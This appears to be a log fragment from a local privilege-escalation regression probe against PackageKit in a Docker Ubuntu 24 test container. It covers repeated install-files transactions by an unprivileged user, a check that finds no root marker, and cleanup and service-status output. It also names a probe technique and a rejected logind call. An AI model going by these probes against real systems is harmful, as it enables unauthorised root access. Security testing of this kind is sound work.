+  signal path=/26_dbaceeea Finished (1, 25)
+
+$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== post-probe root marker/package state =="\nif test -e /root/packagekit_cve41651_root; then\n  echo "ROOT_MARKER_PRESENT"\n  cat /root/packagekit_cve41651_root\nelse\n  echo "ROOT_MARKER_ABSENT"\nfi\ndpkg-query -W -f="\\${Package}\\t\\${Version}\\t\\${Status}\\n" packagekit-cve41651-root 2>&1 || true\necho\necho "== recent PackageKit/polkit journal =="\njournalctl -u packagekit -u polkit --since "-10 min" --no-pager | tail -n 160 || true\n'
+== post-probe root marker/package state ==
+ROOT_MARKER_ABSENT
+dpkg-query: no packages found matching packagekit-cve41651-root
+
+== recent PackageKit/polkit journal ==
+May 16 16:08:48 4f5b414436ae systemd[1]: Starting packagekit.service - PackageKit Daemon...
+May 16 16:08:48 4f5b414436ae PackageKit[9853]: daemon start
+May 16 16:08:48 4f5b414436ae systemd[1]: Started packagekit.service - PackageKit Daemon.
+May 16 16:12:50 4f5b414436ae PackageKit[9853]: install-files transaction /7_abcdeabe from uid 1001 finished with success after 26ms
+May 16 16:12:54 4f5b414436ae PackageKit[9853]: install-files transaction /8_bdcbaaec from uid 1001 finished with success after 22ms
+May 16 16:12:58 4f5b414436ae PackageKit[9853]: install-files transaction /9_ddceeeda from uid 1001 finished with success after 20ms
+May 16 16:13:02 4f5b414436ae PackageKit[9853]: install-files transaction /10_ebcdadee from uid 1001 finished with success after 22ms
+May 16 16:13:06 4f5b414436ae PackageKit[9853]: install-files transaction /11_abdeeaea from uid 1001 finished with success after 20ms
+May 16 16:13:09 4f5b414436ae PackageKit[9853]: install-files transaction /12_aaeaccea from uid 1001 finished with success after 20ms
+May 16 16:13:13 4f5b414436ae PackageKit[9853]: install-files transaction /13_ceaedcce from uid 1001 finished with success after 19ms
+May 16 16:13:17 4f5b414436ae PackageKit[9853]: install-files transaction /14_aaeaeadd from uid 1001 finished with success after 21ms
+May 16 16:13:21 4f5b414436ae PackageKit[9853]: install-files transaction /15_bedcdeeb from uid 1001 finished with success after 25ms
+May 16 16:13:25 4f5b414436ae PackageKit[9853]: install-files transaction /16_caadabab from uid 1001 finished with success after 21ms
+May 16 16:13:28 4f5b414436ae PackageKit[9853]: install-files transaction /17_addbeaed from uid 1001 finished with success after 28ms
+May 16 16:13:32 4f5b414436ae PackageKit[9853]: install-files transaction /18_abacceee from uid 1001 finished with success after 23ms
+May 16 16:13:36 4f5b414436ae PackageKit[9853]: install-files transaction /19_bebaaabc from uid 1001 finished with success after 21ms
+May 16 16:13:40 4f5b414436ae PackageKit[9853]: install-files transaction /20_acbcedca from uid 1001 finished with success after 20ms
+May 16 16:13:43 4f5b414436ae PackageKit[9853]: install-files transaction /21_dbcbecec from uid 1001 finished with success after 26ms
+May 16 16:13:47 4f5b414436ae PackageKit[9853]: install-files transaction /22_abcdcdec from uid 1001 finished with success after 20ms
+May 16 16:13:51 4f5b414436ae PackageKit[9853]: install-files transaction /23_daabbdeb from uid 1001 finished with success after 21ms
+May 16 16:13:55 4f5b414436ae PackageKit[9853]: install-files transaction /24_acebebec from uid 1001 finished with success after 20ms
+May 16 16:13:59 4f5b414436ae PackageKit[9853]: install-files transaction /25_bcdcaade from uid 1001 finished with success after 23ms
+May 16 16:14:02 4f5b414436ae PackageKit[9853]: install-files transaction /26_dbaceeea from uid 1001 finished with success after 25ms
+
+$ docker exec ubuntu24-server-lpe-target bash -lc $'\nset -euo pipefail\necho "== cleanup after probe =="\ndpkg -r packagekit-cve41651-root 2>/dev/null || true\nrm -rf /tmp/packagekit-cve41651 /root/packagekit_cve41651_root\nsystemctl reset-failed packagekit.service polkit.service dbus.service 2>/dev/null || true\necho\necho "== cleanup verification =="\ntest ! -e /root/packagekit_cve41651_root && echo "no root marker"\ntest ! -e /tmp/packagekit-cve41651 && echo "no /tmp probe directory"\ndpkg-query -W packagekit-cve41651-root 2>&1 || true\nsystemctl is-system-running || true\nsystemctl --failed --no-pager || true\nsystemctl status packagekit polkit dbus --no-pager --lines=20 || true\n'
+== cleanup after probe ==
+
+== cleanup verification ==
+no root marker
+no /tmp probe directory
+dpkg-query: no packages found matching packagekit-cve41651-root
+running
+  UNIT LOAD ACTIVE SUB DESCRIPTION
+
+0 loaded units listed.
+● packagekit.service - PackageKit Daemon
+     Loaded: loaded (/usr/lib/systemd/system/packagekit.service; static)
+     Active: active (running) since Sat 2026-05-16 16:08:48 UTC; 5min ago
+   Main PID: 9853 (packagekitd)
+      Tasks: 5 (limit: 9517)
+     Memory: 6.9M (peak: 12.8M)
+        CPU: 623ms
+     CGroup: /docker/4f5b414436aefb655c3e4b9b25b80c8483306cde6cc3186d655231e3631e5f6a/system.slice/packagekit.service
+             └─9853 /usr/libexec/packagekitd
+
+May 16 16:12:50 4f5b414436ae PackageKit[9853]: install-files transaction /7_abcdeabe from uid 1001 finished with success after 26ms
+May 16 16:12:54 4f5b414436ae PackageKit[9853]: install-files transaction /8_bdcbaaec from uid 1001 finished with success after 22ms
+May 16 16:12:58 4f5b414436ae PackageKit[9853]: install-files transaction /9_ddceeeda from uid 1001 finished with success after 20ms
+May 16 16:13:02 4f5b414436ae PackageKit[9853]: install-files transaction /10_ebcdadee from uid 1001 finished with success after 22ms
+May 16 16:13:06 4f5b414436ae PackageKit[9853]: install-files transaction /11_abdeeaea from uid 1001 finished with success after 20ms
+May 16 16:13:09 4f5b414436ae PackageKit[9853]: install-files transaction /12_aaeaccea from uid 1001 finished with success after 20ms
+May 16 16:13:13 4f5b414436ae PackageKit[9853]: install-files transaction /13_ceaedcce from uid 1001 finished with success after 19ms
+May 16 16:13:17 4f5b414436ae PackageKit[9853]: install-files transaction /14_aaeaeadd from uid 1001 finished with success after 21ms
+May 16 16:13:21 4f5b414436ae PackageKit[9853]: install-files transaction /15_bedcdeeb from uid 1001 finished with success after 25ms
+May 16 16:13:25 4f5b414436ae PackageKit[9853]: install-files transaction /16_caadabab from uid 1001 finished with success after 21ms
+May 16 16:13:28 4f5b414436ae PackageKit[9853]: install-files transaction /17_addbeaed from uid 1001 finished with success after 28ms
+May 16 16:13:32 4f5b414436ae PackageKit[9853]: install-files transaction /18_abacceee from uid 1001 finished with success after 23ms
+May 16 16:13:36 4f5b414436ae PackageKit[9853]: install-files transaction /19_bebaaabc from uid 1001 finished with success after 21ms
+May 16 16:13:40 4f5b414436ae PackageKit[9853]: install-files transaction /20_acbcedca from uid 1001 finished with success after 20ms
+May 16 16:13:43 4f5b414436ae PackageKit[9853]: install-files transaction /21_dbcbecec from uid 1001 finished with success after 26ms
+May 16 16:13:47 4f5b414436ae PackageKit[9853]: install-files transaction /22_abcdcdec from uid 1001 finished with success after 20ms
+May 16 16:13:51 4f5b414436ae PackageKit[9853]: install-files transaction /23_daabbdeb from uid 1001 finished with success after 21ms
+May 16 16:13:55 4f5b414436ae PackageKit[9853]: install-files transaction /24_acebebec from uid 1001 finished with success after 20ms
+May 16 16:13:59 4f5b414436ae PackageKit[9853]: install-files transaction /25_bcdcaade from uid 1001 finished with success after 23ms
+May 16 16:14:02 4f5b414436ae PackageKit[9853]: install-files transaction /26_dbaceeea from uid 1001 finished with success after 25ms
+
+● polkit.service - Authorization Manager
+     Loaded: loaded (/usr/lib/systemd/system/polkit.service; static)
+     Active: active (running) since Sat 2026-05-16 15:18:51 UTC; 55min ago
+       Docs: man:polkit(8)
+   Main PID: 258 (polkitd)
+      Tasks: 4 (limit: 9517)
+     Memory: 5.8M (peak: 6.9M)
+        CPU: 1.499s
+     CGroup: /docker/4f5b414436aefb655c3e4b9b25b80c8483306cde6cc3186d655231e3631e5f6a/system.slice/polkit.service
+             └─258 /usr/lib/polkit-1/polkitd --no-debug
+
+May 16 15:18:51 4f5b414436ae systemd[1]: Starting polkit.service - Authorization Manager...
+May 16 15:18:51 4f5b414436ae polkitd[258]: Started polkitd version 124
+May 16 15:18:51 4f5b414436ae polkitd[258]: Loading rules from directory /etc/polkit-1/rules.d
+May 16 15:18:51 4f5b414436ae polkitd[258]: Loading rules from directory /usr/share/polkit-1/rules.d
+May 16 15:18:51 4f5b414436ae polkitd[258]: Finished loading, compiling and executing 6 rules
+May 16 15:18:51 4f5b414436ae systemd[1]: Started polkit.service - Authorization Manager.
+May 16 15:18:51 4f5b414436ae polkitd[258]: Acquired the name org.freedesktop.PolicyKit1 on the system bus
+
+● dbus.service - D-Bus System Message Bus
+     Loaded: loaded (/usr/lib/systemd/system/dbus.service; static)
+     Active: active (running) since Sat 2026-05-16 15:18:51 UTC; 55min ago
+TriggeredBy: ● dbus.socket
+       Docs: man:dbus-daemon(1)
+   Main PID: 255 (dbus-daemon)
+      Tasks: 2 (limit: 9517)
+     Memory: 3.1M (peak: 4.1M)
+        CPU: 1.508s
+     CGroup: /docker/4f5b414436aefb655c3e4b9b25b80c8483306cde6cc3186d655231e3631e5f6a/system.slice/dbus.service
+             ├─ 255 @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
+             └─1528 /usr/libexec/netplan/netplan-dbus
+
+May 16 15:32:17 4f5b414436ae dbus-daemon[255]: [system] Failed to activate service 'org.freedesktop.timesync1': timed out (service_start_timeout=25000ms)
+May 16 15:35:54 4f5b414436ae dbus-daemon[255]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.266' (uid=0 pid=4879 comm="/usr/lib/snapd/snapd")
+May 16 15:35:54 4f5b414436ae dbus-daemon[255]: [system] Successfully activated service 'org.freedesktop.timedate1'
+May 16 15:37:29 4f5b414436ae dbus-daemon[255]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.268' (uid=0 pid=5348 comm="/usr/lib/snapd/snapd")
+May 16 15:37:29 4f5b414436ae dbus-daemon[255]: [system] Successfully activated service 'org.freedesktop.timedate1'
+May 16 15:37:29 4f5b414436ae dbus-daemon[255]: [system] Activating via systemd: service name='org.freedesktop.PackageKit' unit='packagekit.service' requested by ':1.271' (uid=1001 pid=5396 comm="busctl --system call org.freedesktop.PackageKit /o")
+May 16 15:37:29 4f5b414436ae dbus-daemon[255]: [system] Successfully activated service 'org.freedesktop.PackageKit'
+May 16 15:43:13 4f5b414436ae dbus-daemon[255]: [system] Rejected send message, 2 matched rules; type="method_call", sender=":1.285" (uid=1002 pid=6351 comm="/usr/bin/python3 /home/selfauth/active-login1-devi") interface="org.freedesktop.login1.Session" member="SetClass" error name="(unset)" requested_reply="0" destination=":1.3" (uid=0 pid=263 comm="/usr/lib/systemd/systemd-logind")
+May 16 15:51:55 4f5b414436ae dbus-daemon[255]: [system] Activating via systemd: service name='org.freedesktop.ModemManager1' unit='dbus-org.freedesktop.ModemManager1.service' requested by ':1.374' (uid=0 pid=9369 comm="busctl introspect --system org.freedesktop.ModemMa")
+May 16 15:52:20 4f5b414436ae dbus-daemon[255]: [system] Failed to activate service 'org.freedesktop.ModemManager1': timed out (service_start_timeout=25000ms)
+May 16 16:08:48 4f5b414436ae dbus-daemon[255]: [system] Activating via systemd: service name='org.freedesktop.PackageKit' unit='packagekit.service' requested by ':1.386' (uid=0 pid=9842 comm="gdbus introspect --system --dest org.freedesktop.P")
+May 16 16:08:48 4f5b414436ae dbus-daemon[255]: [system] Successfully activated service 'org.freedesktop.PackageKit'
+May 16 16:09:02 4f5b414436ae dbus-daemon[255]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.394' (uid=0 pid=9947 comm="/usr/lib/snapd/snapd")
+May 16 16:09:02 4f5b414436ae dbus-daemon[255]: [system] Successfully activated service 'org.freedesktop.timedate1'
+May 16 16:10:27 4f5b414436ae dbus-daemon[255]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.403' (uid=0 pid=10687 comm="/usr/lib/snapd/snapd")
+May 16 16:10:27 4f5b414436ae dbus-daemon[255]: [system] Successfully activated service 'org.freedesktop.timedate1'
+May 16 16:11:36 4f5b414436ae dbus-daemon[255]: [system] Activating via systemd: service name='org.freedesktop.timedate1' unit='dbus-org.freedesktop.timedate1.service' requested by ':1.420' (uid=0 pid=11211 comm="/usr/lib/snapd/snapd")
+May 16 16:11:36 4f5b414436ae dbus-daemon[255]: [system] Successfully activated service 'org.freedesktop.timedate1'
+May 16 16:12:29 4f5b414436ae dbus-daemon[255]: [system] Activating via systemd: service name='org.freedesktop.ModemManager1' unit='dbus-org.freedesktop.ModemManager1.service' requested by ':1.432' (uid=0 pid=11449 comm="busctl --system introspect org.freedesktop.ModemMa")
+May 16 16:12:54 4f5b414436ae dbus-daemon[255]: [system] Failed to activate service 'org.freedesktop.ModemManager1': timed out (service_start_timeout=25000ms)
+
+probe log: /Users/andrewmohawk/Documents/UbuntuLPE/ubuntu24-server-lpe/logs/packagekit-cve41651-regression.out
